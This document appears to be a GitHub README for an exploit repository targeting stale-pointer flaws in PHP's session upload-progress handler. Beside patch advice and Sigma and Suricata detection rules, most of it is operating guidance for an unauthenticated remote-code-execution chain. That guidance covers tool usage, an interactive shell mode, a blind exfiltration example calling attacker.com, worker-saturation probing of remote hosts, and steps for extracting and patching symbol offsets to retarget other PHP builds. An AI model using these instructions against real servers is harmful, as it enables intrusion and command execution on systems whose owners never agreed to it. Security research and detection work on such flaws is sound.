# php2shell - CVE-2026-109618 / CVE-2026-109619 PoC

**Remote Code Execution via PHP Session Handler Stale Pointer**

Two critical vulnerabilities in PHP's session upload progress handler allow unauthenticated remote code execution against stock Apache + mod_php deployments. No application-level vulnerability (LFI, file upload, deserialization) is required -- just a reachable `index.php`.

The point of this repo is to help detect what servers are vulnerable and to provide evidence of working code.
I take no credit for creation of the PoCs. Just thought they would be good to have in one place, along with detection and remediation guidance.

| | |
|---|---|
| **CVE-2026-109618** | `post_bytes_processed` stale pointer -- hash-table insertion increments counters before allocation completes; OOM during `php_url_encode()` in `END` cleanup leaves an uninitialized bucket that `php_session_flush()` treats as a valid `zend_string` |
| **CVE-2026-109619** | `current_file_bytes_processed` stale pointer -- worker-wide `PS()` fields point to freed per-request memory; a subsequent request follows the stale pointer before re-initialization |
| **CVSS v4** | **9.2 Critical** (both) |
| **Disclosed** | 2026-10-21 |
| **Affected** | PHP 8.2 < 8.2.35, 8.3 < 8.3.36, 8.4 < 8.4.27, 8.5 < 8.5.12 |
| **Fixed in** | PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12 |
| **Vector** | Network / No authentication / No user interaction |

## Am I affected?

If you run **any** of these PHP versions behind Apache with `mod_php` (the prefork MPM), you are vulnerable. No special application code is needed -- the default `index.php` is enough.

| Branch | Vulnerable | Fixed |
|---|---|---|
| PHP 8.2 | 8.2.0 -- 8.2.34 | 8.2.35 |
| PHP 8.3 | 8.3.0 -- 8.3.35 | 8.3.36 |
| PHP 8.4 | 8.4.0 -- 8.4.26 | 8.4.27 |
| PHP 8.5 | 8.5.0 -- 8.5.11 | 8.5.12 |

PHP 8.1 and below are EOL and do not receive patches. If your environment runs these versions, assume vulnerable.

**Quick check:**

```bash
# From the outside:
curl -sI http://your-server/ | grep -E 'X-Powered-By|Server'

# On the server itself:
php -v | head -1
apachectl -V | grep MPM
```

If `X-Powered-By` shows a version in the vulnerable range and the MPM is `prefork`, patch immediately.

## What to do right now

1. **Patch immediately** -- upgrade to PHP 8.2.35, 8.3.36, 8.4.27, or 8.5.12+
2. **If patching is delayed:**
   - Disable `session.upload_progress.enabled` in `php.ini` (set to `0`) -- this is the fastest mitigation and breaks nothing unless your application shows upload progress bars
   - Deploy WAF rules blocking `PHP_SESSION_UPLOAD_PROGRESS` in request bodies
   - Rate-limit concurrent POST connections per source IP
   - Monitor Apache error logs for OOM and segfault patterns (see [Detection](#how-to-detect-exploitation) below)
3. **Long-term:** consider migrating from mod_php + prefork to PHP-FPM + event MPM (different process model, not vulnerable to this specific worker-pinning technique)

## How to detect exploitation

If someone has already attempted this against your server, here is what to look for.

### In your Apache error log

The most obvious indicator is repeated out-of-memory errors followed by segfaults:

```
[error] Allowed memory size of 134217728 bytes exhausted
[notice] child pid 12345 exit signal Segmentation fault (11)
```

If you see both of these in close succession, especially multiple times, investigate immediately.

### Other signs on the server

- Session files (`sess_*`) larger than 1MB in `/tmp` (or your `session.save_path`)
- Session files containing binary / non-printable data
- Shell processes (`sh`, `bash`, `dash`) spawned as children of `apache2` / `httpd`
- Unexpected files in `/tmp` or the webroot written by `www-data`

### In network traffic

- A burst of 149+ concurrent POST requests from a single IP to a single endpoint
- `Transfer-Encoding: chunked` POST requests with no `Content-Length` header
- Multipart bodies containing `PHP_SESSION_UPLOAD_PROGRESS`
- `Set-Cookie: PHPSESSID=` headers larger than 100KB (this is the heap leak -- a normal session cookie is ~60 bytes)

### Sigma rule

```yaml
title: php2shell Session Upload Progress RCE Attempt
id: b7c4d8e0-1234-5678-9abc-def012345678
status: experimental
description: Detects exploitation of CVE-2026-109618/CVE-2026-109619 via session upload progress handler
references:
    - https://github.com/9bie/php2shell-bypass-aslr-exp
logsource:
    category: webserver
    product: apache
detection:
    selection_oom:
        cs-status: 500
        sc-bytes|gt: 100000
    selection_error_log:
        EventData|contains:
            - 'Allowed memory size of'
            - 'bytes exhausted'
    selection_session:
        cs-body|contains: 'PHP_SESSION_UPLOAD_PROGRESS'
    selection_chunked:
        cs-header-transfer-encoding: 'chunked'
        cs-method: 'POST'
    condition: (selection_oom and selection_session) or
               (selection_error_log and selection_session) or
               (selection_chunked and selection_session and selection_oom)
    timeframe: 5m
    count: 10
falsepositives:
    - Legitimate large file uploads with session progress tracking (rare to trigger OOM)
level: high
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2026.109618
    - cve.2026.109619
```

### Suricata rules

```
alert http any any -> $HOME_NET any (msg:"php2shell - PHP_SESSION_UPLOAD_PROGRESS with chunked TE";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"PHP_SESSION_UPLOAD_PROGRESS"; http_client_body;
    content:"Transfer-Encoding|3a 20|chunked"; http_header;
    threshold:type both, track by_src, count 50, seconds 30;
    classtype:web-application-attack;
    sid:2026100; rev:1;)

alert http $HOME_NET any -> any any (msg:"php2shell - Oversized Set-Cookie PHPSESSID (heap leak)";
    flow:to_client,established;
    content:"Set-Cookie|3a 20|PHPSESSID="; http_header;
    isdataat:100000,relative;
    classtype:web-application-attack;
    sid:2026101; rev:1;)
```

---

## How it works

The exploit chain (implemented in `phppoc2.py`) works against **production-default** PHP + Apache prefork:

```
Stage 0  Worker pinning
         Hold 149 incomplete POST bodies to saturate the prefork pool.
         All subsequent exploit requests land on the same child process.

Stage A1 Trigger OOM via nested multipart
         860 depth-64 nested file upload fields + 4000-byte PHP_SESSION_UPLOAD_PROGRESS
         -> php_url_encode() exhausts memory_limit (128M) during END cleanup
         -> PS(id) and PS(mod_data) left dangling, send_cookie=1

Stage B1 Heap leak (OOB read)
         Stale PS(id) now overlaps a reallocated zend_string with len=0xC8000
         -> Set-Cookie: PHPSESSID= encodes ~800KB of raw heap
         -> Extract zval_ptr_dtor address (from HashTable pDestructor)
         -> Calculate libphp.so base address via known symbol offset

Stage A2 Cheap OOM to free PS(hash_serialize_verifier)
         Second OOM leaves hash_serialize_verifier as dangling pointer

Stage B2 Hijack pDestructor -> system()
         Overwrite freed region with fake zval whose pDestructor = zif_system
         -> When HashTable cleanup calls pDestructor, it executes system(cmd)
         -> RCE as www-data
```

**Key bypass**: Chunked Transfer-Encoding bypasses `post_max_size` -- no `Content-Length` header means `content_length=0`, so `rfc1867_post_handler`'s size check is skipped entirely. This allows delivery of the oversized multipart payload needed to trigger OOM.

## Tools

### phppoc2.py -- Full chain RCE (no LFI required)

The real exploit. Uses the stale pointer vulnerabilities to achieve unauthenticated RCE against stock PHP + Apache. Works on production-default configurations (display_errors=Off, memory_limit=128M, MaxRequestWorkers=150).

<img width="1270" height="388" alt="image" src="https://github.com/user-attachments/assets/e7128824-1d74-478d-8119-beb6c0acef31" />


**Currently calibrated for PHP 8.4.26 on Debian 13 (trixie)** -- see [Multi-version support](#multi-version-support) for other versions.

```bash
# Basic usage -- default target is 127.0.0.1
python3 phppoc2.py --port 18110

# Lab target on another machine (authorized testing only)
python3 phppoc2.py --host 10.0.0.5 --port 18110

# Run a custom command
python3 phppoc2.py --port 18110 --cmd 'id; uname -a; whoami'

# Write output to proof file
printf 'id; uname -a; whoami; cat /etc/passwd\n' > out/c
python3 phppoc2.py --port 18110 --cmd 'sh</out/c'
cat out/p1

# Re-run against fresh ASLR (restarts container)
python3 phppoc2.py --port 18110 --restart p2s-pure-18110

# Specify architecture (auto-detected by default)
python3 phppoc2.py --port 18110 --arch aarch64
```

**Options:**

| Flag | Default | Description |
|---|---|---|
| `--host` | 127.0.0.1 | Target host (lab use only; only point at systems you are authorized to test) |
| `--port` | 18110 | Target port |
| `--cmd` | `id>/out/p1` | Command to execute |
| `--proof` | `out/p1` | File to check for RCE proof |
| `--arch` | auto | Architecture (`x86_64` / `aarch64`) |
| `--workers` | 150 | Worker count (match `MaxRequestWorkers`) |
| `--retries` | 3 | Retry attempts for each stage |
| `--restart` | - | Container name to restart between attempts |

### phpexploit.py -- Session poisoning + LFI (companion tool)

**Read this before using it.** This is *not* the CVE-2026-109618/109619 exploit chain — it is the classic `PHP_SESSION_UPLOAD_PROGRESS` session-poisoning technique (known since ~2016) combined with a best-effort race spray against the CVE UAF, packaged as one convenience tool. Every reliable path in it requires an **existing application-level inclusion vector** on the target: an LFI parameter, log poisoning, an exposed FastCGI port, or a reachable `pearcmd.php`. If your target has none of those, `phppoc2.py` is the tool you want (it needs no application flaw).

```bash
# Session poison + auto-detected LFI
python3 phpexploit.py http://target.example.com/index.php "id"

# Specify LFI parameter name
python3 phpexploit.py http://target.example.com/ "id" --lfi-param page

# Interactive shell mode
python3 phpexploit.py http://target.example.com/ "id" -i

# Blind output exfiltration (--callback is an output channel only --
# execution still needs an inclusion vector on the target)
python3 phpexploit.py http://target.example.com/ "id" --callback http://attacker.com/
```

## Remote diagnostic (diag_remote.py)

<img width="1280" height="640" alt="diag_github_social" src="https://github.com/user-attachments/assets/d00341c8-35b0-4f39-8736-3c1a26a503e9" />

A target-agnostic diagnostic tool for probing remote servers **without needing shell access or error logs**. It answers the questions that the Apache error log would normally answer: is this prefork? how many workers? does A1 trigger OOM? does the worker survive?

This is useful when you can reach the target over HTTP but cannot read its logs — run it from your own machine before attempting the full exploit to understand what the target will do.

```bash
# Probe a remote target
python3 diag_remote.py --host 192.168.155.10 --port 80

# Probe a local Docker lab
python3 diag_remote.py --host 127.0.0.1 --port 18110

# Increase probe range for high-capacity servers
python3 diag_remote.py --host 10.0.0.5 --port 80 --max-probe 500
```

**What it checks (5 steps):**

| Step | What it does | What it tells you |
|---|---|---|
| 1 | Reads `Server` and `X-Powered-By` headers | Confirms Apache + PHP version |
| 2 | Holds open incremental POST connections until no worker can serve a GET | Confirms prefork MPM and estimates `MaxRequestWorkers` (use this value for `--workers`) |
| 3 | Releases holders until a worker is free, verifies it responds | Confirms worker pinning works on this target |
| 4 | Fires the A1 OOM payload (same as the real exploit) | Checks if the server returns 500 (= OOM triggered) |
| 5 | Sends a session-triggering POST to the same worker | **Key result:** did the worker survive A1? |

**Interpreting step 5:**

| Result | Meaning | Action |
|---|---|---|
| Worker alive + Set-Cookie present | Worker survived OOM — exploit should work | Run `phppoc2.py` against this target |
| Worker alive + oversized Set-Cookie (>10KB) | Stale pointer confirmed — B1 leak will read heap | Exploit is very likely to succeed |
| Worker NOT responding | Worker crashed (segfault, not OOM bailout) | B1 will always get 0 bytes — the stale pointer is lost. The target's PHP build may handle OOM differently (e.g., `SIGKILL` from cgroup limits, or a stricter allocator). Check if the target has additional memory constraints beyond `memory_limit` |
| Cannot saturate workers | Server is not prefork, or `MaxRequestWorkers` > `--max-probe` | Increase `--max-probe`, or confirm the target uses prefork MPM |

**Options:**

| Flag | Default | Description |
|---|---|---|
| `--host` | *(required)* | Target host |
| `--port` | 80 | Target port |
| `--max-probe` | 300 | Maximum holder connections to try |

## Lab setup

The tested one-command path is `pure/run_pure.sh` (present in this repo). It launches the official `php:8.4.26-apache` image with stock production defaults, mounts `pure/docker/www` as the webroot and `./out` for proof files, and prints the config it verified:

```bash
./pure/run_pure.sh            # official prefork config (MaxRequestWorkers=150)
./pure/run_pure.sh --single   # single-worker override (run exploit with --workers 1)
# fire the exploit
python3 phppoc2.py --port 18110
# check proof
cat out/p1
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
# cleanup
./pure/run_pure.sh && true; docker rm -f p2s-pure-18110
```

Equivalent manual setup, if you prefer:

```bash
# Create minimal webroot
mkdir -p www out
echo '<?php echo "OK\n"; ?>' > www/index.php

# Launch PHP 8.4.26 with production defaults
docker run -d \
    --name p2s-pure-18110 \
    -p 127.0.0.1:18110:80 \
    -v "$PWD/www:/var/www/html:ro" \
    -v "$PWD/out:/out" \
    php:8.4.26-apache \
    /bin/sh -c 'cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini; \
                chown -R www-data:www-data /out; \
                exec apache2-foreground'

# Verify it's running
curl http://127.0.0.1:18110/index.php
# -> OK

# Fire the exploit
python3 phppoc2.py --port 18110

# Check proof
cat out/p1
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Cleanup
docker rm -f p2s-pure-18110
```

## Multi-version support

The exploit's hardcoded offsets are specific to a single PHP build. Out of the box, `phppoc2.py` only works against **PHP 8.4.26 x86_64 on Debian 13 trixie** (the stock `php:8.4.26-apache` Docker image). To target a different vulnerable PHP version, you need to extract that build's symbol offsets and patch them into the exploit.

### Why offsets matter

The exploit needs two addresses inside `libphp.so`:

| Symbol | What it does in the exploit |
|---|---|
| `zval_ptr_dtor` | Its address appears repeatedly in heap-allocated HashTables. The leak stage (B1) reads raw heap memory via the oversized `Set-Cookie`, and the exploit identifies `zval_ptr_dtor` pointers by frequency analysis. From this address, it calculates `libphp.so`'s base address using the formula: `libphp_base = leaked_zval_ptr_dtor - dtor_offset` |
| `zif_system` | The address of PHP's internal `system()` implementation. The exploit overwrites a HashTable's `pDestructor` function pointer with this address, so when PHP cleans up the table it calls `system(cmd)` instead. Calculated as: `zif_system = libphp_base + zif_offset` |

Every PHP rebuild (different version, different OS, different compiler flags) places these symbols at different offsets inside `libphp.so`. Using wrong offsets = the exploit will crash the worker instead of getting RCE.

### Step 1: Identify the target PHP version

Find out what PHP version and architecture the target is running:

```bash
# If you have HTTP access:
curl -sI http://target/ | grep X-Powered-By
# -> X-Powered-By: PHP/8.4.25

# Or from phpinfo() if available:
curl -s http://target/info.php | grep -oP 'PHP Version \K[0-9.]+'
```

Confirm the version is vulnerable (see [Am I affected?](#am-i-affected)). If it's patched, the exploit won't work.

### Step 2: Get the matching Docker image

You need the exact same `libphp.so` binary as the target. For targets running the official PHP Docker images, this is straightforward. **Steps 2-4 are automated by `pure/extract_offsets.sh`** (pulls the image, runs `readelf`, prints the ready-to-patch values):

```bash
pure/extract_offsets.sh 8.4.25          # prints offsets + architecture
pure/extract_offsets.sh 8.4.25 --patch   # also patches PROFILES in phppoc2.py
```

Doing it manually:

```bash
# Pull the matching image (replace 8.4.25 with the target version)
docker pull php:8.4.25-apache

# Start a temporary container
docker run -d --name offset-extract php:8.4.25-apache
```

> **Note:** If the target is running a custom-compiled PHP (not the official Docker image), the offsets will be different even for the same version number. You need a copy of that specific `libphp.so` binary. Extract it from the target if possible, or replicate their exact build environment.

### Step 3: Extract the symbol offsets

Run `readelf` inside the container to find the two symbol offsets:

```bash
docker exec offset-extract \
  readelf -Ws /usr/local/lib/apache2/modules/libphp.so \
  | grep -wE 'zval_ptr_dtor|zif_system'
```

Example output for PHP 8.4.26 x86_64:

```
  5765: 000000000065eb60   123 FUNC    GLOBAL DEFAULT   14 zval_ptr_dtor
  8832: 0000000000465370    85 FUNC    GLOBAL DEFAULT   14 zif_system
```

The offsets you need are in the **second column** (the hex values):
- `zval_ptr_dtor` → `0x65EB60`
- `zif_system` → `0x465370`

Clean up when done:

```bash
docker rm -f offset-extract
```

### Step 4: Determine the architecture

Check whether the target is x86_64 or aarch64:

```bash
docker exec offset-extract uname -m
# -> x86_64  or  aarch64
```

This determines which profile block to edit in the next step.

### Step 5: Patch the offsets into phppoc2.py

Open `phppoc2.py` and find the `PROFILES` dictionary near the top (search for `PROFILES`):

```python
PROFILES = {
    "x86_64": {
        "dtor_offset": 0x65EB60,    # <-- replace with your zval_ptr_dtor offset
        "zif_offset": 0x465370,     # <-- replace with your zif_system offset
        "ptr_max": 0x7FFFFFFFFFFF,
        "delta_min": 0x1A00000,
        "delta_max": 0x1F00000,
    },
    "aarch64": {
        "dtor_offset": 0x63812B,    # <-- replace with your zval_ptr_dtor offset
        "zif_offset": 0x42CD70,     # <-- replace with your zif_system offset
        "ptr_max": 0xFFFFFFFFFFFF,
        "delta_min": 0x1F00000,
        "delta_max": 0x2300000,
    },
}
```

Replace `dtor_offset` with your `zval_ptr_dtor` value, and `zif_offset` with your `zif_system` value, in the correct architecture block.

**Leave `ptr_max`, `delta_min`, and `delta_max` unchanged** -- these are architecture-specific heap geometry constants, not symbol offsets. They are the same across patch releases of the same minor version.

### Step 6: Test in a lab

Always validate against a local Docker container before pointing at a real target:

```bash
# Start vulnerable target (replace version as needed)
docker run -d \
    --name p2s-test \
    -p 127.0.0.1:18110:80 \
    -v "$PWD/pure/docker/www:/var/www/html:ro" \
    -v "$PWD/out:/out" \
    php:8.4.25-apache \
    /bin/sh -c 'cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini; \
                chown -R www-data:www-data /out; \
                exec apache2-foreground'

# Wait for Apache to start
sleep 2
curl -s http://127.0.0.1:18110/index.php
# -> OK

# Run the exploit
mkdir -p out
python3 phppoc2.py --port 18110

# Check proof of RCE
cat out/p1
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Cleanup
docker rm -f p2s-test
```

### Troubleshooting by stage

If the exploit fails, note which stage it stops at:

| Failure point | Symptom | Likely cause | Fix |
|---|---|---|---|
| **A1 (OOM trigger)** | No error, but B1 gets no leak | `memory_limit` is not 128M, or multipart depth is being stripped by a reverse proxy | Check `php.ini` memory_limit; test without proxy |
| **B1 (Heap leak)** | `no Set-Cookie in leak response` | OOM didn't trigger correctly, or `session.upload_progress.enabled = 0` | Verify session.upload_progress is on (it's on by default) |
| **B1 (Heap leak)** | `no heap pointers in leak window` | ASLR randomized to unexpected range, or wrong architecture selected | Retry (ASLR), or set `--arch` explicitly |
| **B1 → B2 gap** | `implausible libphp-main delta` | Wrong `dtor_offset` — the libphp base calculation is wrong, so the delta between libphp and the main heap chunk falls outside the expected range | Re-extract offsets from the exact same binary as the target |
| **B2 (RCE)** | `candidate failed (no proof)` on all retries | Wrong `zif_offset`, or heap layout differs (different minor version) | Re-extract offsets; if different minor version, `delta_min`/`delta_max` may need tuning |
| **B2 (RCE)** | Segfault / worker crash in Apache logs | Offsets are wrong, or heap geometry (the `S = cand + 0xF8398` constant in `run_chain`) doesn't match this PHP version | Confirm you're using offsets from the identical `libphp.so` binary |

### Same minor version vs. different minor version

**Same minor version** (e.g., 8.4.25 vs 8.4.26) — only Steps 3-5 are needed. The heap layout constants (`delta_min`, `delta_max`, `MAIN_BUCKET_COUNT`, the `S = cand + 0xF8398` offset) are typically identical between patch releases within 8.4.x. Just swap the two symbol offsets and the exploit should work.

**Different minor version** (e.g., 8.3.x vs 8.4.x) — the heap geometry may differ. If B1 (leak) succeeds but B2 (RCE) consistently fails with `candidate failed`, the `S` heap offset (`S = cand + 0xF8398`) and/or `delta_min`/`delta_max` need recalibration for that version's allocator behavior. This requires heap analysis with gdb — the calibration kit is vendored in this repo under `pure/` (`RESEARCH_PURE_128M.md` documents the 128M research path; `*.gdb` scripts such as `force_b.gdb`, `state.gdb`, `slots4.gdb` instrument the heap; `mk_b_min.py` / `mk_flood.py` build the probe bodies; `repro_pure.sh` reproduces the diagnostic runs). The upstream repo (`9bie/php2shell-bypass-aslr-exp`) has the full research history and evidence logs.

## Known limitations

- **Single-binary calibration.** Out of the box the exploit works against `php:8.4.26-apache` (Debian trixie build) only. Other builds need offset extraction (see [Multi-version support](#multi-version-support)); other *minor* versions additionally need heap-geometry recalibration.
- **Apache mod_php + prefork only.** The worker-pinning stage assumes the prefork process model. PHP-FPM / event MPM targets need a different approach.
- **`--proof` is read on the runner's machine.** With a remote `--host`, either share the `/out` volume or use an out-of-band `--cmd` (e.g. a callback request) instead of the default `id>/out/p1`.
- **`run_pure.sh --dbg`** expects a debug image (`php2shell-dbg:gdb`) built from upstream's `src/` — the PHP source tarball is not vendored here.
- **`phpexploit.py` needs an inclusion vector** (LFI / logs / FastCGI / PEAR). It is not the CVE chain; `phppoc2.py` is.
- **Docker Desktop / WSL2 is not a viable lab environment.** The exploit's heap geometry constants were calibrated on native Linux Docker. WSL2's Microsoft custom kernel places the heap above `libphp.so` in the address space (native Linux places it below), which inverts the delta used to calculate `zif_system`. Use native Linux Docker (bare metal, a real VM, or a cloud instance) for lab testing.

## Verifying the repo works

Run `./selftest.sh` after cloning — it compiles every Python file, verifies the `pwn_pure.py` alias resolves, checks that every helper `phppoc2.py` and `run_pure.sh` reference actually exists, and (with `--docker`, if Docker is available) boots the lab target and fires one exploit attempt end-to-end.

## Requirements

- Python 3.9+ (standard library only — no third-party packages required)
- Docker (for lab setup only)

## Repository layout & provenance

Everything in `pure/` plus `phppoc2.py` is vendored from [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) (the working upstream PoC for Ahmed Sultan's research). Verification: the exploit chain (`phppoc2.py`) and all nine helpers it invokes were byte-identical to upstream at vendoring time; upstream's `pure/evidence/` contains dated run logs proving first-try RCE (`uid=33(www-data)`) against the stock image on both x86_64 and aarch64.

| File(s) | Origin |
|---|---|
| `phppoc2.py`, `pure/*.py`, `pure/run_pure.sh`, `pure/docker/` | Vendored from 9bie's repo (upstream's entry point `exploit.py` is vendored here as `phppoc2.py`) |
| `pure/RESEARCH_PURE_128M.md`, `pure/*.gdb`, `pure/mk_b_min.py`, `pure/mk_flood.py`, `pure/watch_md.sh`, `pure/repro_pure.sh` | Vendored from 9bie's repo — the heap-recalibration kit for other PHP minor versions |
| `phpexploit.py` | Original to this repo (session poisoning + LFI companion; see its section above) |
| `diag_remote.py` | Original to this repo — target-agnostic remote diagnostic (no shell/log access needed) |
| `pure/extract_offsets.sh`, `selftest.sh`, `.gitignore` | Original to this repo — lab tooling |
| `README.md`, `LICENSE` | Original packaging; GPL-3.0 applies to this repo's original files (the upstream vendored code carries no explicit license — the upstream repo is the authoritative source) |

Local divergence from upstream (kept minimal and deliberate):

- `phppoc2.py` adds a `--host` flag (default `127.0.0.1`) threaded through to the helpers
- `phppoc2.py` tries multiple B1 leak-spec layouts per A1 (4 variants with different hole positions/sizes) to improve reliability across ASLR rolls
- `pure/pwn_pure.py` points at `phppoc2.py` instead of upstream's `exploit.py` filename
- `phpexploit.py` `try_log_poison()`: fixed unescaped shell metacharacters in the `system()` payload (upstream bug)
- `pure/decode_cookie.py`, `pure/repro_pure.sh`: widened pointer-range filter to cover both x86_64 and aarch64
- `pure/watch_md.sh`: added guard for missing `run_a1_probe.sh` dependency

## Credits

- **Original research**: [Ahmed Sultan](https://github.com/Syrex1013) ([@0x4148](https://x.com/0x4148)) -- vulnerability discovery and initial exploit
- **Working upstream PoC**: [9bie](https://github.com/9bie/php2shell-bypass-aslr-exp) -- full ASLR bypass chain, chunked TE bypass, production-config exploit
- **Detection rules**: [ikow](https://github.com/ikow/php2shell-poc) -- Sigma, Suricata, and ModSecurity detection rules
- **This repo**: [struttonpigeon](https://github.com/struttonpigeon) -- PoC packaging, session poisoning variant, lab documentation

## References
- [php.net security advisory](https://www.php.net/ChangeLog-8.php)
- [Rapid7 AttackerKB analysis](https://attackerkb.com/)
- [Datadog threat research](https://securitylabs.datadoghq.com/)
- [9bie exploit writeup (English)](https://github.com/9bie/php2shell-bypass-aslr-exp/blob/main/readme_en.md)

## Disclaimer

This tool is provided for **authorized security testing and research purposes only**. Use it only against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The authors are not responsible for misuse.
